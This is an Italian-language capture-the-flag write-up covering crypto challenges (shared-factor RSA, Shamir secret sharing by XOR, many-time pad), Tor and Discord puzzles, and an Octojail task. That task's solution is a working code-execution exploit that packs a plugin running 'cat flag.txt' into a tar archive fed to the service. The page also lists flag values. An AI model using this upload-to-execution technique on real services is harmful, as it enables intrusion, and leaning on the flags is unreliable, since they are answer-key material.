+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">zlib</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">chunk</span><span class="p">(</span><span class="n">typ</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">typb</span> <span class="o">=</span> <span class="n">typ</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;ascii&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">crc</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">crc32</span><span class="p">(</span><span class="n">typb</span> <span class="o">+</span> <span class="n">data</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFF</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="o">+</span> <span class="n">typb</span> <span class="o">+</span> <span class="n">data</span> <span class="o">+</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="n">crc</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">build_png</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sig</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x89</span><span class="s2">PNG</span><span class="se">\r\n\x1a\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ihdr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;IIBBBBB&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">text_key</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;6ee494848e978ea&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">text_val</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;d50bc687e6e14f8f8&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">text_data</span> <span class="o">=</span> <span class="n">text_key</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">text_val</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rare_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;2b6b2c6ba2912d219d&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">idat_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>  <span class="c1"># empty accepted</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sig</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;IHDR&#34;</span><span class="p">,</span> <span class="n">ihdr</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;tEXt&#34;</span><span class="p">,</span> <span class="n">text_data</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;raRE&#34;</span><span class="p">,</span> <span class="n">rare_data</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;IDAT&#34;</span><span class="p">,</span> <span class="n">idat_data</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span><span class="p">(</span><span class="s2">&#34;IEND&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">build_png</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;pass.png&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Wrote pass.png (</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="si">}</span><span class="s2"> bytes)&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><h4 id="note-finali-1">Note finali<a hidden class="anchor" aria-hidden="true" href="#note-finali-1">#</a></h4>
+<p>Le stringhe che sembrano esadecimali non vengono mai interpretate—il confronto avviene sui byte ASCII letterali. Consentire il color type 6 qui non aggiunge valore, quindi il type 2 evita complicazioni su palette e alpha. Poiché non avviene decompressione, un <code>IDAT</code> vuoto basta. Qualunque deviazione—lunghezze errate, costante alterata, chunk mancante o CRC non corrispondente—provoca l’aborto prima dell’output. Il risultato è un PNG volutamente minuscolo e deterministico, usato come “token” di accesso.</p>
+<h2 id="cryptography-">Cryptography 🔑<a hidden class="anchor" aria-hidden="true" href="#cryptography-">#</a></h2>
+<h3 id="repeated-rsa">Repeated RSA<a hidden class="anchor" aria-hidden="true" href="#repeated-rsa">#</a></h3>
+<h4 id="riepilogo-della-challenge-1">Riepilogo della challenge<a hidden class="anchor" aria-hidden="true" href="#riepilogo-della-challenge-1">#</a></h4>
+<p>Ci vengono dati tre moduli RSA (<code>n1</code>, <code>n2</code>, <code>n3</code>), tutti con lo stesso esponente <code>e = 65537</code>. Il ciphertext è il risultato di tre cifrature in sequenza, ogni volta con un modulo diverso:</p>
+<pre tabindex="0"><code>c = (((m^e mod n1)^e mod n2)^e mod n3)
+</code></pre><p>A prima vista sembra sicuro, ma se i moduli condividono fattori, è finita.</p>
+<h4 id="outline-della-soluzione">Outline della soluzione<a hidden class="anchor" aria-hidden="true" href="#outline-della-soluzione">#</a></h4>
+<p>Il trucco è calcolare <code>gcd(n1, n2)</code>, <code>gcd(n1, n3)</code> e <code>gcd(n2, n3)</code>. Se due moduli condividono un primo, possiamo fattorizzare tutti e tre. Una volta fattorizzati, costruiamo le chiavi private e decifriamo in ordine inverso: prima con <code>n3</code>, poi <code>n2</code>, quindi <code>n1</code>.</p>
+<h4 id="flag-1">Flag<a hidden class="anchor" aria-hidden="true" href="#flag-1">#</a></h4>
+<p>Dopo aver eseguito lo script, otteniamo:</p>
+<pre tabindex="0"><code>ctf{3c1315f63d550570a690f693554647b7763c3acbc806ae846ce8d25b5f364d10}
+</code></pre><h4 id="script">Script<a hidden class="anchor" aria-hidden="true" href="#script">#</a></h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="n">gcd</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span> <span class="n">inverse</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ... (codice invariato come nell’originale) ...</span>
+</span></span></code></pre></div><h3 id="sss">SSS<a hidden class="anchor" aria-hidden="true" href="#sss">#</a></h3>
+<p>Questa challenge fornisce tre grandi blob esadecimali chiamati <code>P1</code>, <code>P2</code> e <code>P3</code>:</p>
+<ul>
+<li><code>P1=&quot;8010ba0d6ed3...&quot;</code></li>
+<li><code>P2=&quot;80264e325aa0...&quot;</code></li>
+<li><code>P3=&quot;8036f43f3473...&quot;</code></li>
+</ul>
+<p>La descrizione (“Shamir sarà orgoglioso”) suggerisce <strong>Shamir’s Secret Sharing (SSS)</strong>. Con tre allegati e nessun altro parametro, l’impostazione più naturale è uno schema <strong>3-di-3</strong> su GF($2^8$), dove dobbiamo ricostruire il segreto.</p>
+<h4 id="cosa-sono-gli-allegati">Cosa sono gli allegati<a hidden class="anchor" aria-hidden="true" href="#cosa-sono-gli-allegati">#</a></h4>
+<p>Ogni <code>P*</code> è una <strong>share</strong> codificata in hex. Prima della matematica conviene guardare la struttura:</p>
+<ul>
+<li>Tutti e tre iniziano con <code>0x80</code> seguito da un byte variabile (<code>0x10</code>, <code>0x26</code>, <code>0x36</code>).</li>
+<li>Dopo i <strong>primi 2 byte</strong>, i rimanenti hanno <strong>stessa lunghezza</strong> in ogni blob.</li>
+</ul>
+<p>Questo suggerisce un piccolo <strong>header/metadata</strong> da 2 byte (comune in formati di share) seguito dal <strong>payload</strong> della share (i valori y di un punto Shamir). Non ci serve la metadata per ricostruire il segreto, quindi possiamo scartare quei due byte e lavorare sui body allineati.</p>
+<h4 id="lidea-chiave">L’idea chiave<a hidden class="anchor" aria-hidden="true" href="#lidea-chiave">#</a></h4>
+<p>La ricostruzione di Shamir in $x=0$ usa l’interpolazione di Lagrange. Se le tre share sono in $x\in{1,2,3}$ (scelta comune), in campi di caratteristica 2 (come GF(2⁸)) i coefficienti di Lagrange in $x=0$ risultano <strong>1, 1, 1</strong>:</p>
+$$
+\lambda_1=\frac{(0-2)(0-3)}{(1-2)(1-3)}=\frac{(2)(3)}{(3)(2)}=1,\quad
+\lambda_2=\frac{(0-1)(0-3)}{(2-1)(2-3)}=\frac{(1)(3)}{(1)(3)}=1,\quad
+\lambda_3=\frac{(0-1)(0-2)}{(3-1)(3-2)}=\frac{(1)(2)}{(2)(1)}=1.
+$$<p>In caratteristica 2, l’addizione è XOR. Quindi il segreto in $x=0$ è semplicemente lo <strong>XOR byte-a-byte</strong> dei tre payload:</p>
+$$
+\text{secret} = y_1 \oplus y_2 \oplus y_3.
+$$<p>(Se sei scettico sui punti campionati, il test più rapido è provare lo XOR: se esce qualcosa di sensato, fatto. E infatti funziona. 🙂)</p>
+<h4 id="recupero-del-segreto">Recupero del segreto<a hidden class="anchor" aria-hidden="true" href="#recupero-del-segreto">#</a></h4>
+<ol>
+<li>
+<p><strong>Parsa hex</strong>, <strong>scarta i primi 2 byte</strong> (header) di ciascuna share.</p>
+</li>
+<li>
+<p><strong>XOR</strong> dei tre body byte-per-byte.</p>
+</li>
+<li>
+<p>Ispeziona il risultato:</p>
+<ul>
+<li>Il pattern dei byte è <code>00 63 00 74 00 66 ...</code>, ovvero <strong>UTF-16BE</strong>.</li>
+<li>Leggendo <strong>dalla fine</strong> si vede <code>00 7B 00 66 00 74 00 63</code> → <code>{ftc</code>, cioè il testo è <strong>invertito</strong>.</li>
+</ul>
+</li>
+<li>
+<p>Decodifica come <strong>UTF-16BE</strong>, poi <strong>inverti la stringa</strong>.</p>
+</li>
+</ol>
+<h5 id="riproduzione-minimale">Riproduzione minimale<a hidden class="anchor" aria-hidden="true" href="#riproduzione-minimale">#</a></h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ... (codice invariato come nell’originale) ...</span>
+</span></span></code></pre></div><h4 id="soluzione-2">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-2">#</a></h4>
+<p>Facendo XOR dei tre body e decodificando il risultato come <strong>UTF-16BE</strong>, poi invertendolo, otteniamo:</p>
+<pre tabindex="0"><code>ctf{d6b72529c6177d8f648ae85f624a24d6f1edce5ca29bd7cc0b888e117a123892}
+</code></pre><h3 id="xorbitant">XORbitant<a hidden class="anchor" aria-hidden="true" href="#xorbitant">#</a></h3>
+<p>Questa challenge fornisce due allegati, uno script Python e un dump binario.
+In sostanza si tratta di decifrare un ciphertext cifrato con lo XOR tra un plaintext molto grande e la flag.</p>
+<p>L’operazione di cifratura è eseguita dal seguente codice:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ... (codice invariato come nell’originale) ...</span>
+</span></span></code></pre></div><p>Questo codice è vulnerabile a frequency attack ma anche a many-time-pad (poiché la flag è riutilizzata su blocchi da 69 caratteri, <code>ctf{sha256sum}</code>).
+Nel nostro caso abbiamo preferito ricostruire la flag usando il tool CLI <code>mtp</code> e, man mano che scoprivamo parti del testo, rivelare la flag carattere per carattere.</p>
+<p>Per farlo, è bastato dividere il ciphertext in chunk da 69 byte, codificarli in esadecimale e scriverli riga per riga in un txt da passare al tool.</p>
+<p>Una volta fatto, potevamo indovinare i primi 4 byte sapendo che la flag iniziava con <code>ctf{</code>.</p>
+<h2 id="miscellaneous-">Miscellaneous 🐧<a hidden class="anchor" aria-hidden="true" href="#miscellaneous-">#</a></h2>
+<h3 id="octojail">Octojail<a hidden class="anchor" aria-hidden="true" href="#octojail">#</a></h3>
+<h4 id="panoramica">Panoramica<a hidden class="anchor" aria-hidden="true" href="#panoramica">#</a></h4>
+<p>Un servizio Python legge una stringa di cifre ottali (terzine), le converte in byte, interpreta il risultato come un archivio tar, lo estrae in <code>uploads/</code> (con controlli basilari di path), poi importa <code>plugin.py</code> e chiama <code>run()</code> se presente. Il servizio impone un timeout di 6 secondi, richiede input solo ottale di lunghezza multipla di 3 e limita la dimensione.</p>
+<h4 id="osservazione-chiave">Osservazione chiave<a hidden class="anchor" aria-hidden="true" href="#osservazione-chiave">#</a></h4>
+<ul>
+<li>Il servizio esegue <code>plugin.run()</code> da un <code>plugin.py</code> estratto — <strong>arbitrary code execution</strong> tramite un archivio tar fornito.</li>
+</ul>
+<h4 id="strategia-di-exploit">Strategia di exploit<a hidden class="anchor" aria-hidden="true" href="#strategia-di-exploit">#</a></h4>
+<ol>
+<li>Creare un <code>plugin.py</code> che esegua l’azione desiderata (es. <code>ls</code> o leggere <code>flag.txt</code>).</li>
+<li>Impacchettare <code>plugin.py</code> in un archivio tar.</li>
+<li>Convertire i byte del tar in una stringa di terzine ottali.</li>
+<li>Fornire quella stringa al servizio.</li>
+<li>Il servizio estrae l’archivio ed esegue <code>plugin.run()</code>, eseguendo il nostro codice.</li>
+</ol>
+<p><strong>Lettura di un file di flag:</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># plugin.py</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">tar cf plugin.tar plugin.py
+</span></span></code></pre></div><p>Conversione del tar in terzine ottali (Python):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="c1"># tar_to_octal.py</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;plugin.tar&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">octal</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">b</span><span class="si">:</span><span class="s2">03o</span><span class="si">}</span><span class="s2">&#34;</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">octal</span><span class="p">)</span>
+</span></span></code></pre></div><p>Questo stampa la stringa ottale da incollare nel prompt del programma target.</p>
+<h4 id="conclusione">Conclusione<a hidden class="anchor" aria-hidden="true" href="#conclusione">#</a></h4>
+<p>Dopo aver inviato il nostro script come stringa ottale e l’esecuzione da parte del server, otteniamo la flag.</p>
+<h3 id="onions1">onions1<a hidden class="anchor" aria-hidden="true" href="#onions1">#</a></h3>
+<p><strong>onions1</strong> è una semplice ma divertente misc challenge che introduce ai servizi nascosti .onion (Tor).</p>
+<p>Il compito: visitare il seguente URL .onion usando Tor Browser:</p>
+<pre tabindex="0"><code>2ujjzkrfk4ls4r6vbvvkpn5nyouimcw5hjarezbznvsowfjzup7otdad.onion
+</code></pre><p>Una volta avviato Tor e aperto il link, compare la seguente pagina:</p>
+<p><img alt="Screenshot della pagina .onion" loading="lazy" src="/images/onions1.png"></p>
+<p>Tutto qui! A volte la challenge riguarda solo conoscere lo strumento giusto—qui, Tor Browser.
+Se non l’hai mai usato, è una buona occasione per provare e vedere come funzionano i siti .onion.</p>
+<h3 id="escaping-barcellona">Escaping Barcellona<a hidden class="anchor" aria-hidden="true" href="#escaping-barcellona">#</a></h3>
+<p>In questa challenge, l’obiettivo era determinare la distanza tra Marte e Barcellona a una data e ora specifiche. La tolleranza consentita era di ±0.009 milioni di chilometri, piuttosto generosa. Questo margine, unito a un po’ di fortuna, ha permesso di evitare le coordinate esatte di Barcellona e concentrarsi invece sulla distanza Terra-Marte nel complesso.</p>
+<p>Per risolvere, è stata usata la libreria Astropy, che fornisce calcoli astronomici precisi. Sfruttando le effemeridi JPL, si assicurano posizioni accurate dei pianeti per la data e l’ora indicate. Lo script calcola le posizioni baricentriche di Marte e della Terra, poi la distanza euclidea. Questo approccio evita la necessità di una posizione specifica sulla Terra, dato che la differenza, su questa scala, è trascurabile entro la tolleranza.</p>
+<p>Ecco lo script usato:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">astropy.coordinates</span> <span class="kn">import</span> <span class="n">EarthLocation</span><span class="p">,</span> <span class="n">get_body_barycentric</span><span class="p">,</span> <span class="n">solar_system_ephemeris</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">astropy.time</span> <span class="kn">import</span> <span class="n">Time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">astropy.units</span> <span class="k">as</span> <span class="nn">u</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">obs_time</span> <span class="o">=</span> <span class="n">Time</span><span class="p">(</span><span class="s2">&#34;2025-11-07 16:00:00&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">solar_system_ephemeris</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="s1">&#39;jpl&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">mars_pos</span> <span class="o">=</span> <span class="n">get_body_barycentric</span><span class="p">(</span><span class="s1">&#39;mars&#39;</span><span class="p">,</span> <span class="n">obs_time</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">earth_pos</span> <span class="o">=</span> <span class="n">get_body_barycentric</span><span class="p">(</span><span class="s1">&#39;earth&#39;</span><span class="p">,</span> <span class="n">obs_time</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">distance</span> <span class="o">=</span> <span class="p">(</span><span class="n">mars_pos</span> <span class="o">-</span> <span class="n">earth_pos</span><span class="p">)</span><span class="o">.</span><span class="n">norm</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">distance_km</span> <span class="o">=</span> <span class="n">distance</span><span class="o">.</span><span class="n">to</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">km</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Distance from Earth to Mars at </span><span class="si">{</span><span class="n">obs_time</span><span class="o">.</span><span class="n">iso</span><span class="si">}</span><span class="s2"> UTC: </span><span class="si">{</span><span class="n">distance_km</span><span class="si">:</span><span class="s2">.3f</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="onions2">Onions2<a hidden class="anchor" aria-hidden="true" href="#onions2">#</a></h3>
+<p>Onions2 è stata una misc challenge più tosta e intrigante incentrata sui siti .onion (Tor).</p>
+<p>Abbiamo iniziato caricando l’immagine fornita dalla challenge su <a href="https://www.aperisolve.com/">Aperisolve</a>. Nascosto nei dati dell’immagine, abbiamo scoperto un URL .onion.</p>
+<p>Curiosi, abbiamo avviato Tor e visitato il sito. A prima vista, la pagina sembrava vuota. Dopo un po’ di esplorazione, abbiamo trovato un file di font ospitato sul sito. Dentro quel font, abbiamo scoperto un’altra stringa nascosta.</p>
+<p>Abbiamo passato la stringa a CyberChef, che ha rivelato un nuovo indizio:
+<img alt="alt text" loading="lazy" src="/images/cyberchef-onions2.png"></p>
+<p>CyberChef ha decodificato la stringa in un link Google Maps:
+<a href="https://www.google.com/maps/place/ARChA/@45.7450165,21.225122,17z/data=!4m16!1m9!3m8!1s0x47455d9b87725af1:0x7a82191592d97493!2sARChA!8m2!3d45.7450165!4d21.2277023!9m1!1b1!16s/g/11vbtv2ys4!3m5!1s0x47455d9b87725af1:0x7a82191592d97493!8m2!3d45.7450165!4d21.2277023!16s/g/11vbtv2ys4?entry=ttu&amp;g_ep=EgoyMDI1MDkxMC4wIKXMDSoASAFQAw==">https://www.google.com/maps/place/ARChA/@45.7450165,21.225122,17z/data=!4m16!1m9!3m8!1s0x47455d9b87725af1:0x7a82191592d97493!2sARChA!8m2!3d45.7450165!4d21.2277023!9m1!1b1!16s/g/11vbtv2ys4!3m5!1s0x47455d9b87725af1:0x7a82191592d97493!8m2!3d45.7450165!4d21.2277023!16s/g/11vbtv2ys4?entry=ttu&amp;g_ep=EgoyMDI1MDkxMC4wIKXMDSoASAFQAw==</a></p>
+<p>Il link ci ha portato all’edificio ARChA dell’Università di Timișoara. Lì abbiamo trovato il pezzo finale del puzzle:
+<img alt="alt text" loading="lazy" src="/images/qrcode-onions2.png"></p>
+<p>Nel complesso, Onions2 è stata un’ottima combinazione di forensics digitale, hidden services e problem solving creativo.</p>
+<h3 id="disco-dance">Disco Dance<a hidden class="anchor" aria-hidden="true" href="#disco-dance">#</a></h3>
+<p>Questa challenge forniva due servizi allegati, uno in Python e uno in TypeScript, con l’obiettivo di cifrare la flag usando un seed casuale.</p>
+<p>La parte interessante, però, è nel codice Python, poiché il servizio TypeScript (oltre a non essere vulnerabile) si limitava a proxyare richieste HTTP dal server Python a Discord, aggiungendo un private Discord bot token.</p>
+<p>Nel server Python si notano due funzioni:</p>
+<ul>
+<li>La funzione <code>get_random</code>, che legge 5 messaggi dal canale con id <code>1416908413375479891</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_random</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;https://proxy-gamma-steel-32.vercel.app/api/proxy/channels/1416908413375479891/messages?limit=5&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Bot </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;TOKEN&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
+</span></span></code></pre></div><ul>
+<li>E la funzione <code>encrypt</code>, che cifra la flag con <strong>AES CBC</strong> usando i messaggi ottenuti da <code>get_random</code> come chiave, dopo averli hashati con SHA256.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">key</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">digest</span> <span class="o">=</span> <span class="n">SHA256</span><span class="o">.</span><span class="n">new</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">digest</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">aes_key</span> <span class="o">=</span> <span class="n">digest</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
+</span></span></code></pre></div><h4 id="soluzione-3">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-3">#</a></h4>
+<p>Per ottenere la chiave era necessario accedere al canale Discord e, esplorando il server della CTF, abbiamo notato il canale <code>spam</code> dove i partecipanti inviavano occasionalmente esattamente 5 messaggi.</p>
+<p>Abbiamo confermato che l’ID corrispondeva e abbiamo semplicemente contattato il servizio per far cifrare la flag con una chiave generata da noi.</p>
+<h3 id="disco-rave">Disco Rave<a hidden class="anchor" aria-hidden="true" href="#disco-rave">#</a></h3>
+<p>Per comprendere appieno questo writeup, si consiglia di leggere prima <code>Disco Dance</code>, dato che il ragionamento generale è già spiegato lì.</p>
+<p>L’unico comportamento cambiato è nella <code>get_random</code>. In questa challenge, legge gli ultimi 10 messaggi dai canali <code>1416908413375479891</code> (<strong>spam</strong>) e <code>1417154025371209852</code> (<strong>spam_plus_plus</strong>), poi restituisce un’unica stringa contenente timestamp e messaggi, ordinata prima da <code>spam</code> e poi da <code>spam_plus_plus</code>, da usare come chiave AES.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_random</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">channels</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;1416908413375479891&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;1417154025371209852&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># ...</span>
+</span></span></code></pre></div><h4 id="soluzione-4">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-4">#</a></h4>
+<p>Seguendo la stessa procedura di <code>Disco Dance</code>, è possibile ottenere la flag decifrandola con la chiave AES derivata dai nostri messaggi Discord.</p>
+<h2 id="forensics-">Forensics 🤖<a hidden class="anchor" aria-hidden="true" href="#forensics-">#</a></h2>
+<h3 id="unknown-traffic-1">Unknown Traffic 1<a hidden class="anchor" aria-hidden="true" href="#unknown-traffic-1">#</a></h3>
+<p>Questa challenge aveva un file <code>pcap</code> con vari pacchetti il cui unico scopo era aggiungere rumore al trasporto della flag.
+Dopo aver osservato per un po’ i vari flussi (HTTP, UDP, DNS, FTP), abbiamo notato che i flussi ICMP avevano incongruenze rispetto agli altri, poiché i dati inviati nel body delle richieste avevano due formati:</p>
+<ul>
+<li>Dati esadecimali con un piccolo payload alla fine (circa 2 byte)</li>
+<li>Stringhe ASCII poco chiare</li>
+</ul>
